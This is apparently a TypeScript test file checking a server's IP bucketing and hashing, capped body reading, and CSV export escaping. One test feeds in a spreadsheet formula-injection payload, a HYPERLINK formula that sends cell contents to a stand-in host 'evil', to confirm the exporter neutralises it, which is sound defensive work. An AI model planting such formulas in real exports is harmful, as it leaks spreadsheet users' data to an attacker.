import { describe, expect, it } from "vitest";
import { BodyTooLargeError, hashIp, ipBucket, readCappedText } from "./checkupServer";
import { toCsv } from "./csv";

describe("address buckets", () => {
  it("count IPv4 by address and IPv6 by /64", () => {
    expect(ipBucket("203.0.113.7")).toBe("203.0.113.7");
    expect(ipBucket("::ffff:203.0.113.7")).toBe("203.0.113.7");
    expect(ipBucket("2001:db8:1:2:aaaa::1")).toBe("2001:0db8:0001:0002::/64");
    expect(ipBucket("2001:db8:1:2:ffff:ffff:ffff:ffff")).toBe("2001:0db8:0001:0002::/64");
    expect(ipBucket("2001:db8::")).toBe("2001:0db8:0000:0000::/64");
    expect(ipBucket(null)).toBeNull();
  });

  it("hash them with a server key, never keeping the address", () => {
    const h = hashIp("203.0.113.7")!;
    expect(h).toMatch(/^[0-9a-f]{32}$/);
    expect(h).not.toContain("203");
    expect(hashIp("203.0.113.7")).toBe(h);
    expect(hashIp("203.0.113.8")).not.toBe(h);
  });
});

describe("reading a capped body", () => {
  it("refuses a declared or streamed body over the limit", async () => {
    await expect(readCappedText(new Request("http://x/", { method: "POST", body: "a".repeat(100) }), 50)).rejects.toBeInstanceOf(BodyTooLargeError);
    const stream = new ReadableStream({
      start(c) {
        for (let i = 0; i < 10; i++) c.enqueue(new TextEncoder().encode("b".repeat(20)));
        c.close();
      },
    });
    await expect(readCappedText(new Request("http://x/", { method: "POST", body: stream, duplex: "half" } as RequestInit), 50)).rejects.toBeInstanceOf(BodyTooLargeError);
    expect(await readCappedText(new Request("http://x/", { method: "POST", body: "سلام" }), 50)).toBe("سلام");
  });
});

describe("CSV export", () => {
  it("neutralises cells a spreadsheet would run as formulas, but leaves numbers alone", () => {
    const csv = toCsv(
      [{ a: '=HYPERLINK("http://evil/?"&A2,"x")', b: "+1+1", c: "@SUM(A1)", d: -5000, e: "-12.5", f: "-a", g: "\tx", h: "متن عادی" }],
      ["a", "b", "c", "d", "e", "f", "g", "h"].map((key) => ({ key, header: key }))
    );
    const line = csv.split("\n")[1];
    expect(line).toBe(`"'=HYPERLINK(""http://evil/?""&A2,""x"")",'+1+1,'@SUM(A1),-5000,-12.5,'-a,'\tx,متن عادی`);
  });
});
